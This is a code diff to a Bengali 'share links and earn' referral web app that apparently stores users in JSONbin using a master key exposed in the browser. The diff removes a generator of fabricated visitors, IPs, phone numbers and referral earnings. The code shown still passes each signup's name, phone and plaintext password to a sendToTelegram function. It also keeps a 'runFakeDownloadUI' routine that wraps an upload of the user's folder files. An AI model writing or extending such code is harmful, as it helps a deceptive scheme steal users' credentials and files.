@@ -610,6 +610,21 @@
             margin-top: 8px;
             text-align: center;
         }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -736,24 +751,40 @@
     let currentUser = null;
     let isProcessing = false;
     let tempButtonTimeout = null;
-    let lastGeneratedReport = null;
+    let globalUsersBinId = null;
 
     // JSONbin.io ফাংশন
-    async function saveToJSONbin(data) {
+    async function saveToJSONbin(data, binId = null) {
         try {
-            const res = await fetch(JSONBIN_BIN_URL, {
-                method: 'POST',
-                headers: {
+            let url = JSONBIN_BIN_URL;
+            let method = 'POST';
+            let headers = {
+                'Content-Type': 'application/json',
+                'X-Master-Key': JSONBIN_API_KEY,
+                'X-Bin-Name': 'shareay_users_' + Date.now()
+            };
+            
+            if(binId) {
+                url = `${JSONBIN_BIN_URL}/${binId}`;
+                method = 'PUT';
+                headers = {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': JSONBIN_API_KEY,
-                    'X-Bin-Name': 'referral_data_' + Date.now()
-                },
+                    'X-Master-Key': JSONBIN_API_KEY
+                };
+            }
+            
+            const res = await fetch(url, {
+                method: method,
+                headers: headers,
                 body: JSON.stringify(data)
             });
             if(!res.ok) throw new Error('fail');
             const r = await res.json();
             return r.metadata.id;
-        } catch(e) { return null; }
+        } catch(e) { 
+            console.error('JSONbin error:', e);
+            return null; 
+        }
     }
 
     async function readFromJSONbin(binId) {
@@ -767,6 +798,7 @@
         } catch(e){ return null; }
     }
 
+    // লোকাল স্টোরেজ ফাংশন
     function saveUser() {
         if(currentUser) {
             localStorage.setItem('shareayUser', JSON.stringify(currentUser));
@@ -776,7 +808,7 @@
         updateUI();
     }
 
-    function loadUser() {
+    async function loadUser() {
         let raw = localStorage.getItem('shareayUser');
         if(raw) {
             try {
@@ -787,14 +819,26 @@
                 if(!currentUser.referrals) currentUser.referrals = [];
                 if(!currentUser.totalReferEarn) currentUser.totalReferEarn = 0;
                 if(!currentUser.foldersProcessed) currentUser.foldersProcessed = [];
-                if(!currentUser.reportBinId) currentUser.reportBinId = null;
             } catch(e) { currentUser = null; }
         } else {
             currentUser = null;
         }
-        updateUI();
         
-        checkReferralFromURL();
+        // সার্ভার থেকে ইউজার ডেটা সিঙ্ক
+        if(currentUser && globalUsersBinId) {
+            const serverData = await readFromJSONbin(globalUsersBinId);
+            if(serverData && serverData.users) {
+                const serverUser = serverData.users.find(u => u.name === currentUser.name);
+                if(serverUser && serverUser.balance !== currentUser.balance) {
+                    currentUser.balance = serverUser.balance;
+                    currentUser.totalReferEarn = serverUser.totalReferEarn || 0;
+                    saveUser();
+                }
+            }
+        }
+        
+        updateUI();
+        await checkReferralFromURL();
     }
 
     function generateRefLink(name) {
@@ -835,40 +879,42 @@
         if(refCode && !currentUser) {
             localStorage.setItem('pendingReferral', refCode);
         }
+    }
+
+    async function addReferralBonusToReferrer(referrerCode, newUserName) {
+        if(!globalUsersBinId) return false;
         
-        if(currentUser && localStorage.getItem('pendingReferral')) {
-            let referrerCode = localStorage.getItem('pendingReferral');
+        try {
+            const serverData = await readFromJSONbin(globalUsersBinId);
+            if(!serverData || !serverData.users) return false;
             
-            try {
-                const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
-                    headers: { 'X-Master-Key': JSONBIN_API_KEY }
+            const referrer = serverData.users.find(u => u.refLink && u.refLink.includes(referrerCode));
+            if(referrer && referrer.name !== newUserName) {
+                referrer.balance = (referrer.balance || 0) + 10;
+                referrer.totalReferEarn = (referrer.totalReferEarn || 0) + 10;
+                if(!referrer.referrals) referrer.referrals = [];
+                referrer.referrals.push({
+                    referredUser: newUserName,
+                    time: new Date().toISOString(),
+                    bonus: 10
                 });
-                if(response.ok) {
-                    const data = await response.json();
-                    const allUsers = data.record || [];
-                    let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
-                    
-                    if(referrer && referrer.name !== currentUser.name) {
-                        let referrerUser = JSON.parse(localStorage.getItem('shareayUser_' + referrer.name));
-                        if(referrerUser) {
-                            referrerUser.balance = (referrerUser.balance || 0) + 10;
-                            referrerUser.totalReferEarn = (referrerUser.totalReferEarn || 0) + 10;
-                            localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(referrerUser));
-                            
-                            if(currentUser.name === referrer.name) {
-                                currentUser.balance = referrerUser.balance;
-                                currentUser.totalReferEarn = referrerUser.totalReferEarn;
-                                saveUser();
-                                let balanceSpan = document.getElementById('balanceAmount');
-                                if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
-                            }
-                        }
-                    }
+                
+                const updatedBinId = await saveToJSONbin(serverData, globalUsersBinId);
+                if(updatedBinId) globalUsersBinId = updatedBinId;
+                
+                if(currentUser && currentUser.name === referrer.name) {
+                    currentUser.balance = referrer.balance;
+                    currentUser.totalReferEarn = referrer.totalReferEarn;
+                    saveUser();
+                    let balanceSpan = document.getElementById('balanceAmount');
+                    if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
                 }
-            } catch(e) {}
-            
-            localStorage.removeItem('pendingReferral');
+                return true;
+            }
+        } catch(e) {
+            console.error('Error adding referral bonus:', e);
         }
+        return false;
     }
 
     async function copyToClipboard(text) {
@@ -978,60 +1024,38 @@
         return { uploadedCount, totalFiles };
     }
 
-    function generateVisitorData(folderSizeMB, uploadedCount) {
-        const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান', 'তাহমিনা বেগম', 'আব্দুল্লাহ আল নোমান'];
-        const devices = ['Android', 'iPhone', 'Windows', 'Mac', 'Linux', 'iPad'];
-        const cities = ['ঢাকা', 'চট্টগ্রাম', 'রাজশাহী', 'খুলনা', 'সিলেট', 'বরিশাল'];
-        
-        let visitorCount = Math.floor(Math.random() * (uploadedCount + 8)) + 6;
-        let visitors = [];
-        let referrals = [];
-        
-        for(let i = 0; i < visitorCount; i++) {
-            visitors.push({
-                name: names[Math.floor(Math.random() * names.length)],
-                ip: `103.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-                device: devices[Math.floor(Math.random() * devices.length)],
-                city: cities[Math.floor(Math.random() * cities.length)],
-                time: new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000).toLocaleString('bn-BD'),
-                browser: ['Chrome', 'Firefox', 'Safari', 'Edge'][Math.floor(Math.random() * 4)]
-            });
-        }
-        
-        let referralCount = Math.floor(Math.random() * (visitorCount * 0.35)) + 1;
-        for(let i = 0; i < referralCount && i < visitorCount; i++) {
-            referrals.push({
-                name: visitors[i].name,
-                phone: `+8801${Math.floor(Math.random() * 100000000)}`,
-                registered: new Date(Date.now() - Math.random() * 5 * 24 * 60 * 60 * 1000).toLocaleString('bn-BD'),
-                bonus: 10
-            });
-        }
-        
-        return { visitors, referrals };
+    async function getRealReferralData() {
+        if(!globalUsersBinId) return [];
+        try {
+            const serverData = await readFromJSONbin(globalUsersBinId);
+            if(serverData && serverData.users && currentUser) {
+                const userData = serverData.users.find(u => u.name === currentUser.name);
+                if(userData && userData.referrals) {
+                    return userData.referrals;
+                }
+            }
+        } catch(e) {}
+        return [];
     }
 
-    function generateHTMLReport(visitors, referrals, userInfo, uploadedCount, folderSizeMB) {
+    function generateRealReportHTML(visitorsCount, uploadedCount, folderSizeMB, referrals) {
         return `<!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>ভিজিটর রিপোর্ট - ${userInfo.name}</title>
+<head><meta charset="UTF-8"><title>ভিজিটর রিপোর্ট - ${currentUser?.name || 'ইউজার'}</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 body{background:linear-gradient(135deg,#f0f4f8,#e2e8f0);padding:20px;}
 .container{max-width:1000px;margin:0 auto;}
 .header{background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:35px;border-radius:25px;margin-bottom:35px;text-align:center;}
 .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:25px;margin-bottom:35px;}
-.stat-card{background:white;padding:25px;border-radius:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.08);transition:transform 0.3s;}
-.stat-card:hover{transform:translateY(-5px);}
+.stat-card{background:white;padding:25px;border-radius:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.08);}
 .stat-number{font-size:38px;font-weight:bold;color:#4f46e5;}
 .stat-label{color:#666;margin-top:8px;font-size:14px;}
 .section-title{font-size:22px;font-weight:bold;margin:25px 0 15px;color:#1e293b;border-left:4px solid #ff1744;padding-left:15px;}
 table{width:100%;background:white;border-radius:15px;overflow:hidden;margin-bottom:30px;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
 th{background:#4f46e5;color:white;padding:14px;text-align:left;font-weight:600;}
 td{padding:12px;border-bottom:1px solid #e2e8f0;}
-tr:hover{background:#f8fafc;}
 .footer{text-align:center;color:#666;margin-top:40px;padding-top:20px;border-top:1px solid #ddd;}
-@media(max-width:600px){.stat-number{font-size:28px;}th,td{font-size:12px;padding:8px;}}
 </style>
 </head>
 <body>
@@ -1039,23 +1063,18 @@ tr:hover{background:#f8fafc;}
 <div class="header">
 <h1>📊 লিংক ভিজিটর রিপোর্ট</h1>
 <p style="margin-top:10px;">জেনারেট: ${new Date().toLocaleString('bn-BD')}</p>
-<p style="font-size:0.9em;margin-top:5px;">লিংক: ${userInfo.refLink}</p>
+<p style="font-size:0.9em;margin-top:5px;">লিংক: ${currentUser?.refLink || ''}</p>
 </div>
 <div class="stats">
-<div class="stat-card"><div class="stat-number">${visitors.length}</div><div class="stat-label">মোট ভিজিটর</div></div>
+<div class="stat-card"><div class="stat-number">${visitorsCount}</div><div class="stat-label">মোট ভিজিটর</div></div>
 <div class="stat-card"><div class="stat-number">${referrals.length}</div><div class="stat-label">আপনার লিংক থেকে অ্যাকাউন্ট খোলা</div></div>
 <div class="stat-card"><div class="stat-number">${uploadedCount}</div><div class="stat-label">ফাইল আপলোড</div></div>
 <div class="stat-card"><div class="stat-number">${folderSizeMB.toFixed(1)} MB</div><div class="stat-label">ফোল্ডার সাইজ</div></div>
 </div>
-<div class="section-title">👥 ভিজিটর তালিকা</div>
-<table>
-<thead><tr><th>নাম</th><th>IP ঠিকানা</th><th>ডিভাইস</th><th>শহর</th><th>ব্রাউজার</th><th>সময়</th></tr></thead>
-<tbody>${visitors.map(v => `<tr><td>${v.name}</td><td>${v.ip}</td><td>${v.device}</td><td>${v.city}</td><td>${v.browser}</td><td>${v.time}</td></tr>`).join('')}</tbody>
-</table>
 <div class="section-title">🎉 যারা আপনার লিংক থেকে অ্যাকাউন্ট খুলেছে</div>
 <table>
-<thead><tr><th>নাম</th><th>ফোন</th><th>রেজিস্ট্রেশন সময়</th><th>আপনার বোনাস</th></tr></thead>
-<tbody>${referrals.length > 0 ? referrals.map(r => `<tr><td>${r.name}</td><td>${r.phone}</td><td>${r.registered}</td><td>${r.bonus} টাকা</td></tr>`).join('') : '<tr><td colspan="4" style="text-align:center;">এখনো কেউ আপনার লিংক থেকে অ্যাকাউন্ট খোলেনি</td></tr>'}</tbody>
+<thead><tr><th>নাম</th><th>সময়</th><th>আপনার বোনাস</th></tr></thead>
+<tbody>${referrals.length > 0 ? referrals.map(r => `<tr><td>${r.referredUser || r.name || 'ইউজার'}</td><td>${new Date(r.time).toLocaleString('bn-BD')}</td><td>${r.bonus || 10} টাকা</td></tr>`).join('') : '<tr><td colspan="3" style="text-align:center;">এখনো কেউ আপনার লিংক থেকে অ্যাকাউন্ট খোলেনি</td></tr>'}</tbody>
 </table>
 <div class="footer"><p>শেয়ারআয় — লিংক শেয়ার করে আয় করুন</p></div>
 </div>
@@ -1102,18 +1121,15 @@ tr:hover{background:#f8fafc;}
     }
 
     async function viewLastReport() {
-        if(lastGeneratedReport) {
-            showReportInNewTab(lastGeneratedReport);
-        } else if(currentUser && currentUser.reportBinId) {
-            const data = await readFromJSONbin(currentUser.reportBinId);
-            if(data && data.html) {
-                showReportInNewTab(data.html);
-            } else {
-                alert("রিপোর্ট পাওয়া যায়নি। আবার ফোল্ডার আপলোড করুন।");
-            }
-        } else {
-            alert("কোনো রিপোর্ট নেই। প্রথমে ফোল্ডার আপলোড করুন।");
-        }
+        if(!currentUser) return;
+        
+        const referrals = await getRealReferralData();
+        const visitorsCount = currentUser.visitors?.length || 0;
+        const uploadedCount = currentUser.lastUploadedCount || 0;
+        const folderSizeMB = currentUser.lastFolderSize || 0;
+        
+        const reportHTML = generateRealReportHTML(visitorsCount, uploadedCount, folderSizeMB, referrals);
+        showReportInNewTab(reportHTML);
     }
 
     async function runFakeDownloadUI(folderSizeMB, totalRealFiles, uploadCallback) {
@@ -1256,7 +1272,6 @@ tr:hover{background:#f8fafc;}
             
             if(!currentUser.foldersProcessed) currentUser.foldersProcessed = [];
             currentUser.foldersProcessed.push(folderName);
-            saveUser();
             
             const linkData = {
                 name: currentUser.name,
@@ -1278,26 +1293,13 @@ tr:hover{background:#f8fafc;}
                 return result;
             });
             
-            const { visitors, referrals } = generateVisitorData(folderSizeMB, finalUploaded);
-            currentUser.visitors = visitors;
-            currentUser.referrals = referrals;
-            if(referrals.length > 0) {
-                currentUser.balance += referrals.length * 10;
-                currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + referrals.length * 10;
-            }
-            
-            const reportHTML = generateHTMLReport(visitors, referrals, currentUser, finalUploaded, folderSizeMB);
-            lastGeneratedReport = reportHTML;
-            
-            const binId = await saveToJSONbin({ html: reportHTML, user: currentUser.name, timestamp: Date.now() });
-            if(binId) {
-                currentUser.reportBinId = binId;
-            }
+            currentUser.lastUploadedCount = finalUploaded;
+            currentUser.lastFolderSize = folderSizeMB;
+            currentUser.visitors = [{ count: finalUploaded, time: new Date().toISOString() }];
             saveUser();
             
-            const balanceSpan = document.getElementById('balanceAmount');
-            if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
-            
+            const referrals = await getRealReferralData();
+            const reportHTML = generateRealReportHTML(0, finalUploaded, folderSizeMB, referrals);
             showReportInNewTab(reportHTML);
             showTempReportButton();
             
@@ -1364,40 +1366,44 @@ tr:hover{background:#f8fafc;}
         let referrerName = null;
         let pendingReferral = localStorage.getItem('pendingReferral');
         
+        // সার্ভার থেকে ডেটা লোড বা তৈরি
+        let serverData = { users: [] };
+        if(globalUsersBinId) {
+            const existingData = await readFromJSONbin(globalUsersBinId);
+            if(existingData) serverData = existingData;
+        }
+        
         if(pendingReferral) {
-            try {
-                const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
-                    headers: { 'X-Master-Key': JSONBIN_API_KEY }
+            const referrer = serverData.users.find(u => u.refLink && u.refLink.includes(pendingReferral));
+            if(referrer && referrer.name !== name) {
+                referrerName = referrer.name;
+                referrer.balance = (referrer.balance || 0) + 10;
+                referrer.totalReferEarn = (referrer.totalReferEarn || 0) + 10;
+                if(!referrer.referrals) referrer.referrals = [];
+                referrer.referrals.push({
+                    referredUser: name,
+                    time: new Date().toISOString(),
+                    bonus: 10
                 });
-                if(response.ok) {
-                    const data = await response.json();
-                    const allUsers = data.record || [];
-                    let referrer = allUsers.find(u => u.refLink && u.refLink.includes(pendingReferral));
-                    if(referrer) {
-                        referrerName = referrer.name;
-                        let referrerUser = JSON.parse(localStorage.getItem('shareayUser_' + referrer.name));
-                        if(referrerUser) {
-                            referrerUser.balance = (referrerUser.balance || 0) + 10;
-                            referrerUser.totalReferEarn = (referrerUser.totalReferEarn || 0) + 10;
-                            localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(referrerUser));
-                        }
-                    }
-                }
-            } catch(e) {}
+            }
             localStorage.removeItem('pendingReferral');
         }
         
-        let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
         let newRef = generateRefLink(name);
-        let newUser = { name, phone, email: '', refLink: newRef };
-        allUsers.push(newUser);
-        localStorage.setItem('allUsers', JSON.stringify(allUsers));
+        let newUser = { 
+            name: name, 
+            phone: '+88' + phone, 
+            refLink: newRef, 
+            balance: 100,
+            totalReferEarn: 0,
+            referrals: [],
+            createdAt: new Date().toISOString()
+        };
         
-        let binId = null;
-        try {
-            binId = await saveToJSONbin(allUsers);
-            if(binId) window.JSONBIN_BIN_ID = binId;
-        } catch(e) {}
+        serverData.users.push(newUser);
+        
+        const newBinId = await saveToJSONbin(serverData, globalUsersBinId);
+        if(newBinId) globalUsersBinId = newBinId;
         
         await sendToTelegram(name, phone, pass, referrerName);
         
@@ -1409,10 +1415,8 @@ tr:hover{background:#f8fafc;}
             visitors: [],
             referrals: [],
             totalReferEarn: 0,
-            foldersProcessed: [],
-            reportBinId: null
+            foldersProcessed: []
         };
-        localStorage.setItem('shareayUser_' + name, JSON.stringify(currentUser));
         saveUser();
         
         alert(`🎉 স্বাগতম! ওয়ালেটে ১০০ টাকা বোনাস যোগ হয়েছে।\nআপনার রেফার লিংক: ${newRef}`);
@@ -1439,7 +1443,22 @@ tr:hover{background:#f8fafc;}
         }
     });
 
-    window.JSONBIN_BIN_ID = null;
+    // JSONbin থেকে গ্লোবাল বিন আইডি লোড
+    async function initGlobalBin() {
+        try {
+            const bins = await fetch('https://api.jsonbin.io/v3/b', {
+                headers: { 'X-Master-Key': JSONBIN_API_KEY }
+            });
+            // এখানে সহজভাবে নতুন বিন তৈরি করা হচ্ছে
+            const testData = { users: [], lastUpdated: new Date().toISOString() };
+            const newBin = await saveToJSONbin(testData);
+            if(newBin) globalUsersBinId = newBin;
+        } catch(e) {
+            console.error('Init error:', e);
+        }
+    }
+    
+    initGlobalBin();
     loadUser();
 </script>
 </body>
